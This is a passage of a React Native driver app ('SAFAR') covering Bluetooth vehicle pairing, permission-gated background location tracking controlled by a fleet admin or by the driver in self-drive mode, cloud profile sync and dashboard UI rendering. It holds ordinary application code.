    [bleState.bluetoothStatus, bleState.confidence, filteredSelfDriveHistory]
  );
  const selectedSelfDriveTrip = useMemo(() => {
    if (!selfDriveTripHistory.length) {
      return null;
    }

    return selfDriveTripHistory.find((trip) => trip.id === selectedTripId) || selfDriveTripHistory[0];
  }, [selectedTripId, selfDriveTripHistory]);
  const selfDriveInsights = useMemo(
    () => buildCoachingInsights(selfDriveReportMetrics, filteredSelfDriveHistory),
    [filteredSelfDriveHistory, selfDriveReportMetrics]
  );
  const selfDriveReportSnapshot = useMemo(
    () => buildReportSnapshot(selfDriveReportMetrics, filteredSelfDriveHistory, reportRange),
    [filteredSelfDriveHistory, reportRange, selfDriveReportMetrics]
  );

  async function requestBlePermissionsIfNeeded() {
    if (Platform.OS !== 'android') {
      return true;
    }

    const permissions = [];
    if (Number(Platform.Version) >= 31) {
      permissions.push(
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT
      );
    } else {
      permissions.push(PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION);
    }

    try {
      const result = await PermissionsAndroid.requestMultiple(permissions);
      return permissions.every((permission) => result[permission] === PermissionsAndroid.RESULTS.GRANTED);
    } catch (error) {
      console.error('Failed to request BLE permissions:', error);
      return false;
    }
  }

  async function handlePairBleDevice(device) {
    const normalizedDevice = normalizeBleDevice({
      ...device,
      lastSeenAt: new Date().toISOString(),
    });

    if (!normalizedDevice) {
      return;
    }

    await AsyncStorage.setItem(PAIRED_BLE_DEVICE_KEY, JSON.stringify(normalizedDevice));
    setBleState((current) => ({
      ...current,
      pairedDevice: normalizedDevice,
      confidence: 'High',
      bluetoothStatus: normalizedDevice.name,
    }));
    setSelfDriveMetrics((current) => {
      const nextMetrics = normalizeSelfDriveMetrics({
        ...current,
        bluetoothStatus: normalizedDevice.name,
        confidence: 'High',
      });
      AsyncStorage.setItem(SELF_DRIVE_METRICS_KEY, JSON.stringify(nextMetrics)).catch(() => {});
      return nextMetrics;
    });

    if (selfDriveProfile) {
      try {
        const syncedProfile = await syncSelfDriveProfileToCloud({
          profile: selfDriveProfile,
          pairedBleDevice: normalizedDevice,
          latestMetrics: {
            ...selfDriveMetrics,
            bluetoothStatus: normalizedDevice.name,
            confidence: 'High',
          },
        });
        const nextProfile = normalizeSelfDriveProfile({
          ...selfDriveProfile,
          ...syncedProfile,
          driverName: syncedProfile.driverName,
          phone: syncedProfile.phone,
          vehicleModel: syncedProfile.vehicleModel,
          vehiclePlate: syncedProfile.vehiclePlate,
        });
        await AsyncStorage.setItem(SELF_DRIVE_PROFILE_KEY, JSON.stringify(nextProfile));
        setSelfDriveProfile(nextProfile);
      } catch (error) {
        console.error('Failed to sync paired BLE device to cloud:', error);
      }
    }

    Alert.alert('Vehicle paired', `${normalizedDevice.name} is now set as the trusted vehicle.`);
  }

  async function handleClearBlePairing() {
    await AsyncStorage.removeItem(PAIRED_BLE_DEVICE_KEY);
    setBleState((current) => ({
      ...current,
      pairedDevice: null,
      confidence: current.detectedDevices.length ? 'Medium' : 'Low',
      bluetoothStatus: 'Pair vehicle',
    }));
    setSelfDriveMetrics((current) => {
      const nextMetrics = normalizeSelfDriveMetrics({
        ...current,
        bluetoothStatus: 'Pair vehicle',
        confidence: 'Low',
      });
      AsyncStorage.setItem(SELF_DRIVE_METRICS_KEY, JSON.stringify(nextMetrics)).catch(() => {});
      return nextMetrics;
    });

    if (selfDriveProfile) {
      try {
        const syncedProfile = await syncSelfDriveProfileToCloud({
          profile: selfDriveProfile,
          latestMetrics: {
            ...selfDriveMetrics,
            bluetoothStatus: 'Pair vehicle',
            confidence: 'Low',
          },
          clearBleDevice: true,
        });
        const nextProfile = normalizeSelfDriveProfile({
          ...selfDriveProfile,
          ...syncedProfile,
          driverName: syncedProfile.driverName,
          phone: syncedProfile.phone,
          vehicleModel: syncedProfile.vehicleModel,
          vehiclePlate: syncedProfile.vehiclePlate,
        });
        await AsyncStorage.setItem(SELF_DRIVE_PROFILE_KEY, JSON.stringify(nextProfile));
        setSelfDriveProfile(nextProfile);
      } catch (error) {
        console.error('Failed to clear paired BLE device from cloud:', error);
      }
    }
  }

  const runBleVehicleScan = useCallback(async (options = {}) => {
    const bleManager = bleManagerRef.current || ensureBleManager();
    const silent = options.silent === true;

    if (!bleManager) {
      if (!silent) {
        Alert.alert('Bluetooth unavailable', 'BLE manager is not ready on this device.');
      }
      return;
    }

    const hasPermission = await requestBlePermissionsIfNeeded();
    if (!hasPermission) {
      if (!silent) {
        Alert.alert('Permission needed', 'Bluetooth permissions are required to detect the vehicle device.');
      }
      return;
    }

    setBleState((current) => ({
      ...current,
      isScanning: true,
      scanError: null,
      detectedDevices: [],
    }));

    const seen = new Map();
    const pairedDeviceId = bleState.pairedDevice?.id || null;

    try {
      bleManager.startDeviceScan(null, null, (error, device) => {
        if (error) {
          console.error('BLE scan failed:', error);
          setBleState((current) => ({
            ...current,
            isScanning: false,
            scanError: error.message || 'Scan failed',
          }));
          bleManager.stopDeviceScan();
          return;
        }

        if (!device?.id || !(device.name || device.localName)) {
          return;
        }

        seen.set(device.id, normalizeBleDevice({
          id: device.id,
          name: device.name,
          localName: device.localName,
          rssi: device.rssi,
          lastSeenAt: new Date().toISOString(),
        }));

        const detectedDevices = Array.from(seen.values()).slice(0, 8);
        const matchedTrustedVehicle = pairedDeviceId
          ? detectedDevices.find((entry) => entry.id === pairedDeviceId)
          : null;

        setBleState((current) => ({
          ...current,
          detectedDevices,
          confidence: matchedTrustedVehicle ? 'High' : detectedDevices.length ? 'Medium' : 'Low',
          bluetoothStatus: matchedTrustedVehicle
            ? `Trusted vehicle confirmed: ${matchedTrustedVehicle.name}`
            : current.pairedDevice
              ? `Trusted vehicle not found yet`
              : detectedDevices.length
                ? 'Vehicle nearby'
                : current.bluetoothStatus,
        }));
      });

      setTimeout(() => {
        bleManager.stopDeviceScan();
        setBleState((current) => ({
          ...current,
          isScanning: false,
        }));
      }, 8000);
    } catch (error) {
      console.error('BLE scan setup failed:', error);
      setBleState((current) => ({
        ...current,
        isScanning: false,
        scanError: error.message || 'Scan failed',
      }));
      }
    }, [bleState.pairedDevice?.id, ensureBleManager]);

  async function handleScanBleDevices() {
    await runBleVehicleScan({ silent: false });
  }

  useEffect(() => {
    if (!isSelfDriveMode || !bleState.pairedDevice || bleState.isScanning) {
      return;
    }

    if ((selfDriveMetrics.currentSpeedKmh || 0) < SELF_DRIVE_CAR_DETECTION_SPEED_KMH) {
      return;
    }

    const now = Date.now();
    if (now - lastAutoBleScanAtRef.current < SELF_DRIVE_BLE_SCAN_COOLDOWN_MS) {
      return;
    }

    lastAutoBleScanAtRef.current = now;
    runBleVehicleScan({ silent: true }).catch((error) => {
      console.error('Failed auto BLE vehicle verification:', error);
    });
  }, [
    bleState.isScanning,
    bleState.pairedDevice,
    isSelfDriveMode,
    runBleVehicleScan,
    selfDriveMetrics.currentSpeedKmh,
  ]);

  async function handleOpenSelfDriveReportExport() {
    if (!selfDriveProfile?.id) {
      Alert.alert(
        'Cloud sync pending',
        'Create or sync your self-drive profile first, then the PDF-ready report can be opened.'
      );
      return;
    }

    const reportUrl = buildSelfDriveReportExportUrl({
      profileId: selfDriveProfile.id,
      range: reportRange,
    });

    try {
      const canOpen = await Linking.canOpenURL(reportUrl);

      if (!canOpen) {
        Alert.alert('Report unavailable', 'This device could not open the report link.');
        return;
      }

      await Linking.openURL(reportUrl);
    } catch (error) {
      console.error('Failed to open self-drive report export:', error);
      Alert.alert('Report error', 'Could not open the PDF-ready report right now.');
    }
  }

    async function requestNotificationPermissionIfNeeded() {
    if (Platform.OS !== 'android' || Number(Platform.Version) < 33) {
      return true;
    }

    try {
      const result = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
      return result === PermissionsAndroid.RESULTS.GRANTED;
    } catch (error) {
      console.error('Failed to request notification permission:', error);
      return false;
    }
  }

  async function handleJoinFleet() {
    const cleanedPhone = driverPhone.trim();
    const cleanedCode = inviteCode.trim();
    const cleanedName = driverName.trim();
    const cleanedVehicleModel = vehicleModel.trim();
    const cleanedVehiclePlate = vehiclePlate.trim().toUpperCase();

    if (!cleanedName || !cleanedPhone || !cleanedVehicleModel || !cleanedVehiclePlate || !cleanedCode) {
      Alert.alert('Missing details', 'Please fill driver name, phone number, vehicle model, number plate, and fleet code.');
      return;
    }

    setJoining(true);

    try {
      await saveAppMode(APP_MODE_FLEET);
      const response = await apiRequest('/api/verify-code', {
        method: 'POST',
        body: JSON.stringify({
          inviteCode: cleanedCode,
          driverPhone: cleanedPhone,
          driverName: cleanedName,
          vehicleModel: cleanedVehicleModel,
          vehiclePlate: cleanedVehiclePlate,
        }),
      });

      const json = await response.json();

      if (!response.ok || !json.success) {
        throw new Error(json.error || 'Could not join fleet.');
      }

      const nextSession = {
        driverId: json.data.driver.id,
        fleetId: json.data.fleet.id,
        fleetName: json.data.fleet.name,
        inviteCode: json.data.fleet.inviteCode,
        phone: cleanedPhone,
        driverName: cleanedName,
        vehicleModel:
          json.data.driver?.vehicleModel ||
          json.data.vehicle?.model ||
          cleanedVehicleModel,
        vehiclePlate:
          json.data.driver?.vehiclePlate ||
          json.data.vehicle?.plateNumber ||
          json.data.vehicle?.registrationNumber ||
          cleanedVehiclePlate,
        joinedAt: json.data.driver.joinedAt,
      };

      await AsyncStorage.setItem(DRIVER_SESSION_KEY, JSON.stringify(nextSession));
      setAppMode(APP_MODE_FLEET);
      setSession(nextSession);
      setInviteCode('');
      Alert.alert('Joined', 'Driver session has been created on this device.');
    } catch (error) {
      Alert.alert('Join failed', error.message || 'Something went wrong.');
    } finally {
      setJoining(false);
    }
  }

  async function handleSelectAppMode(nextMode) {
    await saveAppMode(nextMode);
    setAppMode(nextMode);
  }

  async function handleCompleteSelfDriveSetup() {
    const cleanedName = driverName.trim();
    const cleanedPhone = driverPhone.trim();
    const cleanedVehicleModel = vehicleModel.trim();
    const cleanedVehiclePlate = vehiclePlate.trim().toUpperCase();

    if (!cleanedName || !cleanedPhone || !cleanedVehicleModel || !cleanedVehiclePlate) {
      Alert.alert('Missing details', 'Please fill your name, phone number, vehicle model, and number plate.');
      return;
    }

    const nextProfile = {
      driverName: cleanedName,
      phone: cleanedPhone,
      vehicleModel: cleanedVehicleModel,
      vehiclePlate: cleanedVehiclePlate,
      joinedAt: new Date().toISOString(),
    };

      const nextMetrics = normalizeSelfDriveMetrics({
        ...selfDriveMetrics,
        bluetoothStatus: 'Pair vehicle',
      });

      let syncedProfile = nextProfile;

      try {
        const cloudProfile = await syncSelfDriveProfileToCloud({
          profile: nextProfile,
          latestMetrics: nextMetrics,
        });
        syncedProfile = normalizeSelfDriveProfile({
          ...nextProfile,
          ...cloudProfile,
          driverName: cloudProfile.driverName,
          phone: cloudProfile.phone,
          vehicleModel: cloudProfile.vehicleModel,
          vehiclePlate: cloudProfile.vehiclePlate,
        });
      } catch (error) {
        console.error('Failed to sync self-drive profile to cloud:', error);
      }

      await AsyncStorage.setItem(SELF_DRIVE_PROFILE_KEY, JSON.stringify(syncedProfile));
      await AsyncStorage.setItem(SELF_DRIVE_METRICS_KEY, JSON.stringify(nextMetrics));
      await saveAppMode(APP_MODE_SELF);
      setAppMode(APP_MODE_SELF);
      setSelfDriveProfile(syncedProfile);
      setSelfDriveMetrics(nextMetrics);
      const trackingResult = await ensureSelfDriveTracking({ silent: true });
      Alert.alert(
        'Self Drive ready',
        trackingResult.success
          ? 'Your personal driving profile has been created and trip tracking is now active.'
          : 'Your personal driving profile has been created. Allow location and notification permissions to activate trip tracking.'
      );
    }

  async function handleSwitchMode() {
    await saveAppMode('');
    setAppMode(null);
    setInviteCode('');
  }

  async function requestLocationPermissions(options = {}) {
    setRequestingLocation(true);

    try {
      const foreground = await Location.requestForegroundPermissionsAsync();
      setLocationPermission(foreground.status);

      if (foreground.status !== 'granted') {
        if (options.showAlert !== false) {
          Alert.alert('Permission needed', 'Foreground location permission is required to track the driver.');
        }
        return false;
      }

      return true;
    } catch (error) {
      console.error('Failed to request location permissions:', error);
      if (options.showAlert !== false) {
        Alert.alert('Permission error', 'Could not request location permission on this device.');
      }
      return false;
    } finally {
      setRequestingLocation(false);
    }
  }

  async function persistTrackingState(nextTrackingState) {
    const normalizedTrackingState = normalizeTrackingState(nextTrackingState);
    await AsyncStorage.setItem(TRACKING_STATUS_KEY, JSON.stringify(normalizedTrackingState));
    setTrackingState(normalizedTrackingState);
  }

  async function updateDutyState({ dutyStatus, trackingExpected, reason, sessionId, isTracking }) {
    const nextTrackingState = normalizeTrackingState({
      ...trackingState,
      dutyStatus,
      trackingExpected,
      reason: reason || null,
      sessionId: sessionId || null,
      isTracking,
    });

    await pushTrackingStatus(nextTrackingState);
    await persistTrackingState(nextTrackingState);
    return nextTrackingState;
  }

  async function startTrackingWithRemoteState(remoteTrackingState, options = {}) {
    const hasPermission = await requestLocationPermissions({
      showAlert: options.silent !== true,
    });

    if (!hasPermission) {
      return { success: false, reason: 'location_permission_denied' };
    }

    const hasNotificationPermission = await requestNotificationPermissionIfNeeded();

    if (!hasNotificationPermission) {
      return { success: false, reason: 'notification_permission_denied' };
    }

    try {
      const isStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME);

      if (!isStarted) {
        await clearTelemetryState();
        await Location.startLocationUpdatesAsync(LOCATION_TASK_NAME, {
          accuracy: Location.Accuracy.Balanced,
          timeInterval: LOCATION_UPDATE_INTERVAL_MS,
          distanceInterval: LOCATION_DISTANCE_INTERVAL_METERS,
          deferredUpdatesInterval: LOCATION_UPDATE_INTERVAL_MS,
          deferredUpdatesDistance: 0,
          pausesUpdatesAutomatically: false,
          foregroundService: {
            notificationTitle: 'Safar live tracking is on',
            notificationBody: 'Keep the app in recent apps so location can continue syncing.',
          },
        });
      }

      const initialLocation = await getBestAvailableLocation();
      const syncedAt = new Date().toISOString();

      if (initialLocation?.coords) {
        await pushLocationUpdate(initialLocation);
      }

      const nextTrackingState = {
        ...trackingStateRef.current,
        ...remoteTrackingState,
        isTracking: true,
        lastUpdatedAt: initialLocation?.coords ? syncedAt : null,
        trackingExpected: true,
        reason: remoteTrackingState.reason || null,
        sessionId: remoteTrackingState.sessionId || trackingStateRef.current.sessionId || generateSessionId(),
      };

      await pushTrackingStatus(nextTrackingState);
      await persistTrackingState(nextTrackingState);
      if (!options.silent) {
        Alert.alert('Tracking started', 'Location syncing has been turned on by the fleet admin.');
      }
      return { success: true };
    } catch (error) {
      console.error('Failed to start tracking:', error);
      if (!options.silent) {
        Alert.alert('Tracking error', error?.message || 'Could not start location tracking.');
      }
      return { success: false, reason: 'start_failed', error };
      }
    }

  async function ensureSelfDriveTracking(options = {}) {
    const hasPermission = await requestLocationPermissions({
      showAlert: options.silent !== true,
    });

    if (!hasPermission) {
      return { success: false, reason: 'location_permission_denied' };
    }

    const hasNotificationPermission = await requestNotificationPermissionIfNeeded();

    if (!hasNotificationPermission) {
      return { success: false, reason: 'notification_permission_denied' };
    }

    try {
      const isStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME);

      if (!isStarted) {
        await Location.startLocationUpdatesAsync(LOCATION_TASK_NAME, {
          accuracy: Location.Accuracy.Balanced,
          timeInterval: LOCATION_UPDATE_INTERVAL_MS,
          distanceInterval: LOCATION_DISTANCE_INTERVAL_METERS,
          deferredUpdatesInterval: LOCATION_UPDATE_INTERVAL_MS,
          deferredUpdatesDistance: 0,
          pausesUpdatesAutomatically: false,
          foregroundService: {
            notificationTitle: 'Safar self-drive tracking is on',
            notificationBody: 'Keep the app in recent apps so your score and trip history can keep updating.',
          },
        });
      }

      const initialLocation = await getBestAvailableLocation();
      if (initialLocation?.coords) {
        await pushLocationUpdate(initialLocation);
      }

      return { success: true };
    } catch (error) {
      console.error('Failed to start self-drive tracking:', error);
      if (!options.silent) {
        Alert.alert('Tracking error', error?.message || 'Could not start self-drive tracking.');
      }
      return { success: false, reason: 'start_failed', error };
    }
  }

  async function handleStopTracking(reason = 'other', overrides = {}, options = {}) {
    try {
      const isStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME);

      if (isStarted) {
        await Location.stopLocationUpdatesAsync(LOCATION_TASK_NAME);
      }

      const nextTrackingState = {
        ...trackingState,
        ...overrides,
        isTracking: false,
        lastUpdatedAt: new Date().toISOString(),
        reason,
      };

      await pushTrackingStatus(nextTrackingState);
      await persistTrackingState(nextTrackingState);
      await clearTelemetryState();
      if (!options.silent) {
        Alert.alert('Tracking paused', 'Background location sharing has been stopped.');
      }
    } catch (error) {
      console.error('Failed to stop tracking:', error);
      Alert.alert('Tracking error', 'Could not stop location tracking.');
    }
  }

  useEffect(() => {
    if (!session?.driverId || !session?.fleetId) {
      return undefined;
    }

    let mounted = true;

    async function syncRemoteControl({ silent = true } = {}) {
      if (adminSyncInFlightRef.current) {
        return;
      }

      adminSyncInFlightRef.current = true;

      try {
        const remoteControl = await fetchDriverControlState(session.driverId, session.fleetId);

        if (!mounted) {
          return;
        }

        const currentTrackingState = trackingStateRef.current;
        const nextTrackingState = normalizeTrackingState({
          ...currentTrackingState,
          dutyStatus: remoteControl.dutyStatus,
          trackingExpected: remoteControl.trackingExpected,
          reason: remoteControl.lastTrackingReason || currentTrackingState.reason,
          sessionId: remoteControl.sessionId || currentTrackingState.sessionId,
          overspeedThresholdKmh: remoteControl.overspeedThresholdKmh || OVERSPEED_DEFAULT_THRESHOLD_KMH,
        });
        const shouldTrack = isTrackingCommandEnabled(nextTrackingState);
        const isStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME).catch(() => false);

        if (shouldTrack) {
          if (!isStarted || !currentTrackingState.isTracking) {
            const startResult = await startTrackingWithRemoteState(nextTrackingState, { silent });

            if (!startResult.success && Date.now() - lastRemotePermissionAlertAtRef.current > 30000) {
              lastRemotePermissionAlertAtRef.current = Date.now();
              Alert.alert(
                'Admin requested live tracking',
                startResult.reason === 'notification_permission_denied'
                  ? 'Allow notifications so SAFAR can keep remote tracking active.'
                  : 'Allow location access so SAFAR can start live tracking from admin commands.'
              );
            }
          } else {
            await persistTrackingState({
              ...nextTrackingState,
              isTracking: true,
              lastUpdatedAt: currentTrackingState.lastUpdatedAt,
            });
          }
        } else if (isStarted || currentTrackingState.isTracking) {
          await handleStopTracking('admin_disabled', {
            ...nextTrackingState,
            isTracking: false,
          }, { silent: true });
        } else {
          await persistTrackingState({
            ...nextTrackingState,
            isTracking: false,
          });
        }
      } catch (error) {
        console.error('Failed to sync admin duty control:', error);
      } finally {
        adminSyncInFlightRef.current = false;
      }
    }

    syncRemoteControl({ silent: true });
    const intervalId = setInterval(() => {
      syncRemoteControl({ silent: true });
    }, CONTROL_SYNC_INTERVAL_MS);

    return () => {
      mounted = false;
      clearInterval(intervalId);
    };
  }, [session?.driverId, session?.fleetId]);

  useEffect(() => {
    if (!isSelfDriveMode || !selfDriveProfile) {
      return undefined;
    }

    let cancelled = false;

    async function syncSelfDriveTracking() {
      try {
        const isStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME).catch(() => false);

        if (!isStarted) {
          const result = await ensureSelfDriveTracking({ silent: true });

          if (
            !cancelled &&
            !result.success &&
            Date.now() - lastRemotePermissionAlertAtRef.current > 30000
          ) {
            lastRemotePermissionAlertAtRef.current = Date.now();
            Alert.alert(
              'Enable self-drive tracking',
              result.reason === 'notification_permission_denied'
                ? 'Allow notifications so SAFAR can keep your personal trip tracking active.'
                : 'Allow location access so SAFAR can build your personal score and report history.'
            );
          }
        }
      } catch (error) {
        console.error('Failed to sync self-drive tracking:', error);
      }
    }

    syncSelfDriveTracking();
    const intervalId = setInterval(syncSelfDriveTracking, CONTROL_SYNC_INTERVAL_MS);

    return () => {
      cancelled = true;
      clearInterval(intervalId);
    };
  }, [isSelfDriveMode, selfDriveProfile]);

  async function handleResetDriver() {
    try {
      if (trackingState.isTracking) {
        await handleStopTracking();
      }
    } catch (error) {
      console.error('Failed stopping tracking before reset:', error);
    }

    await AsyncStorage.multiRemove([DRIVER_SESSION_KEY, TRACKING_STATUS_KEY]);
    await clearTelemetryState();
    setSession(null);
    setTrackingState(getDefaultTrackingState());
    setDriverName('');
    setDriverPhone('');
    setVehicleModel('');
    setVehiclePlate('');
    setInviteCode('');
    await handleSwitchMode();
  }

  async function handleResetSelfDrive() {
    await AsyncStorage.multiRemove([
      SELF_DRIVE_PROFILE_KEY,
      SELF_DRIVE_METRICS_KEY,
      SELF_DRIVE_ACTIVE_TRIP_KEY,
      SELF_DRIVE_TRIP_HISTORY_KEY,
    ]);
      setSelfDriveProfile(null);
      setSelfDriveMetrics(getDefaultSelfDriveMetrics());
      setSelfDriveTripHistory(getDefaultTripHistory());
      setActiveSelfDriveTrip(getDefaultActiveTrip());
      setSelectedTripId(null);
      setDriverName('');
    setDriverPhone('');
    setVehicleModel('');
    setVehiclePlate('');
    await handleSwitchMode();
  }

  if (booting) {
    return (
      <SafeAreaView style={styles.loaderScreen}>
        <ActivityIndicator size="large" color="#0f2a5e" />
        <Text style={styles.loaderText}>Preparing driver app...</Text>
        <StatusBar style="dark" />
      </SafeAreaView>
    );
  }

  return (
    <SafeAreaView style={styles.safeArea}>
      <StatusBar style="dark" />
      <KeyboardAvoidingView
        style={styles.flex}
        behavior={Platform.OS === 'ios' ? 'padding' : undefined}
      >
        <ScrollView contentContainerStyle={styles.scrollContent} showsVerticalScrollIndicator={false}>
          <View style={contentStyles}>
            <View style={styles.heroShell}>
              <View style={styles.heroGlow} />
              <View style={[styles.brandRow, isCompact && styles.brandRowCompact]}>
                <View style={styles.brandBadge}>
                  <Text style={styles.brandBadgeText}>S</Text>
                </View>
                <View style={styles.brandCopy}>
                  <Text style={styles.brandTitle}>SAFAR</Text>
                  <Text style={styles.brandSubtitle}>Driver Connect and Live Tracking</Text>
                </View>
                <View style={[styles.statusChip, isCompact && styles.statusChipCompact]}>
                  <View
                    style={[
                      styles.statusDot,
                      isFleetMode && session
                        ? (trackingState.isTracking ? styles.statusDotLive : styles.statusDotIdle)
                        : appMode
                          ? styles.statusDotIdle
                          : styles.statusDotPending,
                    ]}
                  />
                  <Text style={styles.statusChipText}>
                    {!appMode ? 'Ready' : isFleetMode ? (trackingState.isTracking ? 'Live' : 'Connected') : 'Personal'}
                  </Text>
                </View>
              </View>

              {!appMode ? (
                <>
                  <Text style={[styles.sectionEyebrow, styles.heroEyebrow]}>Choose Mode</Text>
                  <Text style={[styles.heroTitle, isCompact && styles.heroTitleCompact]}>
                    Built for Indian fleets and self-driven cars in one telematics app.
                  </Text>
                  <Text style={styles.heroText}>
                    Choose Fleet Driver for admin-managed live tracking, or Self Drive for your personal score, insights, and report journey.
                  </Text>
                </>
              ) : !session && !selfDriveProfile ? (
                <>
                  <Text style={[styles.sectionEyebrow, styles.heroEyebrow]}>{isFleetMode ? 'Driver Login' : 'Self Drive Setup'}</Text>
                  <Text style={[styles.heroTitle, isCompact && styles.heroTitleCompact]}>
                    {isFleetMode ? 'Connect your cab to the fleet in two simple steps.' : 'Create your own car safety workspace in under a minute.'}
                  </Text>
                  <Text style={styles.heroText}>
                    {isFleetMode
                      ? 'Enter your name, mobile number, and fleet code. Once verified, this device will stay logged in.'
                      : 'Set up your own profile, add the car you drive, and start building a telematics score made for Indian roads.'}
                  </Text>
                </>
              ) : (
                <>
                  <Text style={[styles.sectionEyebrow, styles.heroEyebrow]}>{isFleetMode ? 'Connected' : 'Self Drive'}</Text>
                  <Text style={[styles.heroTitle, isCompact && styles.heroTitleCompact]}>
                    {isFleetMode ? `You are now linked to ${session.fleetName}.` : `Welcome back, ${selfDriveProfile?.driverName || 'Driver'}.`}
                  </Text>
                  <Text style={styles.heroText}>
                    {isFleetMode
                      ? 'Duty and live tracking are now controlled from the admin side. Keep location and notification permissions enabled on this phone.'
                      : 'Track your score, review trend cards, and prepare your vehicle pairing and report flow from one clean dashboard.'}
                  </Text>
                </>
              )}
            </View>

            {!appMode ? (
              <View style={[styles.panelGrid, isWide && styles.panelGridWide]}>
                <Card style={[styles.mainCard, styles.gridCard]}>
                  <SectionTitle
                    eyebrow="Mode Select"
                    title="Pick your SAFAR experience"
                    description="Choose the workflow that matches how the vehicle is driven. You can switch later."
                  />

                  <View style={styles.modeGrid}>
                    <ModeChoiceCard
                      title="Fleet Driver"
                      description="For cabs, taxis, and commercial vehicles where duty and tracking are controlled by the admin."
                      onPress={() => handleSelectAppMode(APP_MODE_FLEET)}
                    />
                    <ModeChoiceCard
                      title="Self Drive"
                      accent
                      description="For private car owners who want personal scoring, reports, vehicle pairing, and future insurance-ready insights."
                      onPress={() => handleSelectAppMode(APP_MODE_SELF)}
                    />
                  </View>
                </Card>

                  <Card style={[styles.infoCard, styles.gridCard]}>
                    <Text style={styles.sectionEyebrow}>MVP Ready</Text>
                    <Text style={styles.infoLine}>Fleet Driver mode remains admin-controlled and ready for live monitoring.</Text>
                    <Text style={styles.infoLine}>Self Drive mode now includes personal onboarding, live trip storage, report summaries, and vehicle pairing.</Text>
                    <Text style={styles.infoLine}>Sensor fusion, BLE confidence, and local trip scoring are active in the current MVP build.</Text>
                  </Card>
              </View>
            ) : !session && !selfDriveProfile ? (
              <View style={[styles.panelGrid, isWide && styles.panelGridWide]}>
                <Card style={[styles.mainCard, styles.gridCard]}>
                  <JoinField
                    label={isFleetMode ? 'Driver name' : 'Your name'}
                    value={driverName}
                    onChangeText={setDriverName}
                    placeholder="Enter your full name"
                  />
                  <JoinField
                    label="Phone number"
                    value={driverPhone}
                    onChangeText={setDriverPhone}
                    placeholder="+91XXXXXXXXXX"
                    keyboardType="phone-pad"
                  />
                  <JoinField
                    label="Vehicle model"
                    value={vehicleModel}
                    onChangeText={setVehicleModel}
                    placeholder="Dzire, Ertiga, WagonR"
                    autoCapitalize="words"
                  />
                  <JoinField
                    label="Number plate"
                    value={vehiclePlate}
                    onChangeText={setVehiclePlate}
                    placeholder="UP32AB1234"
                    autoCapitalize="characters"
                  />
                  {isFleetMode ? (
                    <JoinField
                      label="Fleet code"
                      value={inviteCode}
                      onChangeText={setInviteCode}
                      placeholder="12345"
                      keyboardType="number-pad"
                      maxLength={5}
                    />
                  ) : null}

                  <Pressable
                    style={styles.primaryButton}
                    onPress={isFleetMode ? handleJoinFleet : handleCompleteSelfDriveSetup}
                    disabled={joining}
                  >
                    {joining ? (
                      <ActivityIndicator color="#ffffff" />
                    ) : (
                      <Text style={styles.primaryButtonText}>{isFleetMode ? 'Join Fleet' : 'Create Self Drive Profile'}</Text>
                    )}
                  </Pressable>

                  <Pressable style={styles.textButton} onPress={handleSwitchMode}>
                    <Text style={styles.textButtonMutedLabel}>Back to mode select</Text>
                  </Pressable>
                </Card>

                <Card style={[styles.infoCard, styles.gridCard]}>
                  <Text style={styles.sectionEyebrow}>{isFleetMode ? 'How it works' : 'What you get'}</Text>
                  <View style={[styles.stepsWrap, isWide && styles.stepsWrapWide]}>
                    <View style={styles.stepCard}>
                      <Text style={styles.stepNumber}>1</Text>
                      <Text style={styles.stepText}>
                        {isFleetMode
                          ? 'Enter the driver name, phone number, vehicle model, and number plate.'
                          : 'Create your profile with the car you drive most often.'}
                      </Text>
                    </View>
                      <View style={styles.stepCard}>
                        <Text style={styles.stepNumber}>2</Text>
                        <Text style={styles.stepText}>
                          {isFleetMode
                            ? 'Join with the owner fleet code and save the session on this device.'
                            : 'Pair your trusted vehicle and let SAFAR build stronger trip confidence scoring.'}
                        </Text>
                      </View>
                    <View style={styles.stepCard}>
                      <Text style={styles.stepNumber}>3</Text>
                      <Text style={styles.stepText}>
                        {isFleetMode
                          ? 'Tracking follows admin commands automatically for the active duty session.'
                          : 'Use reports, trend cards, and your own driving score without fleet dependency.'}
                      </Text>
                    </View>
                  </View>
                </Card>
              </View>
            ) : isSelfDriveMode ? (
              <View style={[styles.panelGrid, isWide && styles.panelGridWide]}>
                <Card style={[styles.mainCard, styles.gridCard]}>
                  <View style={[styles.statsRow, isCompact && styles.statsRowStack]}>
                    <StatPill title="Today score" value={String(selfDriveMetrics.score)} accent />
                    <StatPill title="Trip confidence" value={selfDriveMetrics.confidence} />
                  </View>
                  <View style={[styles.statsRow, isCompact && styles.statsRowStack]}>
                    <StatPill title="Trips" value={String(selfDriveMetrics.totalTrips)} />
                    <StatPill title="Distance" value={`${selfDriveMetrics.totalDistanceKm} km`} />
                  </View>

                  <View style={styles.detailsCard}>
                    <View style={styles.profileBadgeRow}>
                      <View style={styles.profileBadge}>
                        <Text style={styles.profileBadgeText}>
                          {(selfDriveProfile?.driverName || 'D').charAt(0).toUpperCase()}
                        </Text>
                      </View>
                      <View style={styles.profileMeta}>
                        <Text style={styles.profileName}>{selfDriveProfile?.driverName}</Text>
                        <Text style={styles.profilePhone}>{selfDriveProfile?.phone}</Text>
                      </View>
                    </View>
                    <View style={styles.vehicleInfoGrid}>
                      <View style={styles.vehicleInfoCard}>
                        <Text style={styles.vehicleInfoLabel}>Vehicle model</Text>
                        <Text style={styles.vehicleInfoValue}>{selfDriveProfile?.vehicleModel || 'Not added yet'}</Text>
                      </View>
                      <View style={styles.vehicleInfoCard}>
                        <Text style={styles.vehicleInfoLabel}>Number plate</Text>
                        <Text style={styles.vehicleInfoValue}>{selfDriveProfile?.vehiclePlate || 'Not added yet'}</Text>
                      </View>
                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Bluetooth setup</Text>
                      <Text style={styles.syncValue}>{bleState.bluetoothStatus}</Text>
                    </View>
                    <View style={styles.syncRow}>
                      <Text style={styles.syncLabel}>Top speed</Text>
                      <Text style={styles.syncValue}>{selfDriveMetrics.topSpeedKmh} km/h</Text>
